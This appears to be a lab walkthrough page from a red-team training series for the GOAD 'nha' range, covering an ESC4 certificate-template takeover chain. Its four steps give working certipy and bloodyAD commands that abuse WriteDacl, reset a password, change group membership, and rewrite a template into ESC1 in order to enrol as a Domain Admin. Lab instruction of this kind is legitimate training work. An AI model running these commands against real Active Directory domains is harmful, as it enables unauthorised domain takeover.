# nha solution - the ESC4 chain redStackPRO plants and nothing served

`nha` (Ninja Hack Academy, a GOAD community lab) is covered technique-by-technique
in [the coverage page](../labs/nha.md). This page exists because that audit found
a technique the lab really plants and **no page anywhere taught**: an ESC4
certificate-template takeover in `ninja.hack`, reached across a forest trust.

The reason it went unserved is worth stating, because it is a property of how the
series is filtered rather than an oversight. ESC4 is modelled as an **ACL on the
template object**, not as a vuln id, so a scan for `esc*` ids does not see it. And
the authored [part 6](../goad/part-06-adcs.md) names essos hosts in every step, so
a filter that keeps a step when the lab has the host it names drops the whole page
here. Steps filter by the host they name, not by the capability they need - the
known limit recorded in ADR 0058, of which this is the concrete instance.

> **Status: authored from the lab's own template and the roles that plant it, not
> yet run against a live range.** Every fact below was read out of
> `frontend/public/goad/nha.json` and the compiled artifact. The commands follow
> the series' usual shape but carry no "Live verification" block, and should not
> be trusted the way parts 01-12 of the GOAD series can be. Verify on a deploy
> before relying on it.

## Methodology

Same external red-team framing as the [GOAD series](../goad/README.md), see
[[range-access-model]]: the jumpbox is the only public host, everything else is
private, and the operator works through a beacon's SOCKS proxy
([[tests-run-through-beacon]]). Commands below assume `proxychains` over that
SOCKS and the two domains in `/etc/hosts`.

## Topology - and why it makes this a cross-forest problem

**nha is two forests, not a parent and a child.** Both domains compile with
`parent_fqdn: null` and the trust between them is `type: forest, bidirectional`.
(For contrast, a real child - goad-light's `north.sevenkingdoms.local` - compiles
with `parent_fqdn: sevenkingdoms.local` and `type: parent_child`.)

| host | domain | role |
|------|--------|------|
| `dc-vil` | `ninja.hack` (NINJA) | DC **and the Enterprise CA** - the only host in this forest |
| `dc-ac` | `academy.ninja.lan` (ACADEMY) | DC |
| `web` | ACADEMY | member - `iis_webshell`, `writable_share`, CredSSP server |
| `sql` | ACADEMY | member - `mssql_impersonation`, `mssql_linked` |
| `share` | ACADEMY | member - CredSSP client, `schedule` |

That table is the whole point: **every member server is in ACADEMY, and the CA and
the ESC4 template are in NINJA.** So a foothold earned the ordinary way - the
kerberoastable `HTTP/WEB` and `MSSQLSvc/sql` accounts, the IIS webshell - lands
you in the wrong forest, and reaching the template means crossing the trust.

## The chain

Four ACL edges in `ninja.hack` form one path from a low user to Domain Admin.
Read them as a chain rather than four findings:

```
olivia.davis  --WriteDacl-->  rachel.philips  (member of Sanin)
Sanin         --GenericAll->  Jonin           (group over group)
Jonin         --GenericAll->  CN=SignatureValidation,CN=Certificate Templates,...
                              ^ ESC4: control of a template you can then enrol from
```

The `ninja.hack` cast: `alice.johnson` is Hokage and **Domain Admin**;
`rachel.philips`, `ava.brown`, `henry.martinez` are **Sanin**; `david.wilson`,
`yara.yuhi`, `katherine.white`, `uma.johnson` are **Jonin**; `frank.umino` and
`olivia.davis` are **Academy_Teacher**. Passwords are in the deploy's
`RANGE-BRIEFING.md`, which is the source of truth for any given range.

### 1. Confirm the template and the edge

`SignatureValidation` is not an upstream Windows template. redStackPRO plants a
generic enrollable template of that exact name on the CA host so the lab's ACL has
something to resolve against (`redstackpro_adcs_acl_templates`, injected by the
compiler onto `cyb-dc-vil`). Find it, and find who controls it:

```bash
proxychains certipy find -u 'olivia.davis@ninja.hack' -p '<pw>' \
  -dc-ip <dc-vil> -vulnerable -stdout
```

Read the output for `SignatureValidation` and for a `Write Property Principals` /
owner entry naming `Jonin`. If certipy does not flag it as vulnerable yet, that is
correct - the template is inert until you rewrite it in step 4. The finding you
want here is the **ACL**, not an ESC id.

### 2. Take `rachel.philips` with the WriteDacl

`olivia.davis` holds `WriteDacl` on `rachel.philips`, which means she can grant
herself the right to reset that password:

```bash
proxychains bloodyAD --host <dc-vil> -d ninja.hack \
  -u olivia.davis -p '<pw>' \
  add genericAll rachel.philips olivia.davis
proxychains bloodyAD --host <dc-vil> -d ninja.hack \
  -u olivia.davis -p '<pw>' \
  set password rachel.philips '<new-pw>'
```

Resetting a real user's password is destructive to the lab's own story - note the
original from the briefing so the range stays usable for the next run.

### 3. Add yourself to `Jonin`

The `Sanin -> Jonin` edge is `GenericAll` **from a group to a group**, so any
member of Sanin can write Jonin's membership:

```bash
proxychains bloodyAD --host <dc-vil> -d ninja.hack \
  -u rachel.philips -p '<new-pw>' \
  add groupMember Jonin rachel.philips
```

Re-authenticate afterwards. Group membership rides in the Kerberos ticket, so a
ticket issued before this change does not carry Jonin and the next step fails in a
way that looks like the ACL is wrong.

### 4. ESC4: rewrite the template into ESC1, then enrol

With `GenericAll` on the template object you can make it issue what you want.
Certipy's `template` action rewrites it to the classic vulnerable shape - enrollee
supplies subject, client authentication EKU, no manager approval:

```bash
proxychains certipy template -u 'rachel.philips@ninja.hack' -p '<new-pw>' \
  -dc-ip <dc-vil> -template SignatureValidation -write-default-configuration
```

Then enrol as the Domain Admin, which is what the whole chain was for:

```bash
proxychains certipy req -u 'rachel.philips@ninja.hack' -p '<new-pw>' \
  -dc-ip <dc-vil> -ca NINJA-CA \
  -template SignatureValidation -upn alice.johnson@ninja.hack
proxychains certipy auth -pfx alice.johnson.pfx -dc-ip <dc-vil>
```

Certipy saves the template's prior configuration; put it back when you are done,
or the lab keeps a live ESC1 that nothing declared.

> The CA's common name follows the role's convention of the domain short name plus
> `-CA`, so `NINJA-CA` on this lab. Confirm with `certipy find` rather than
> assuming it - the name is what `-ca` has to match.

## What this page does not cover

`ninja.hack` also carries `hokage -> Domain Admins` and `hokage -> AdminSDHolder`,
both `GenericAll`, and ACADEMY carries the `gmsaNFS$ -> backup -> Sensei /
AdminSDHolder` chain. Those are ordinary ACL abuse and
[part 11](../goad/part-11-acl.md) serves them properly - nine edges across the two
domains, which the coverage page originally recorded as "no". They are listed in
[the coverage page](../labs/nha.md), not repeated here.

ESC7 remains out of reach: it needs `manageCA`, which this lab does not grant, so
[part 14](../goad/part-14-adcs-advanced.md) stays "no" for its own stated reason.
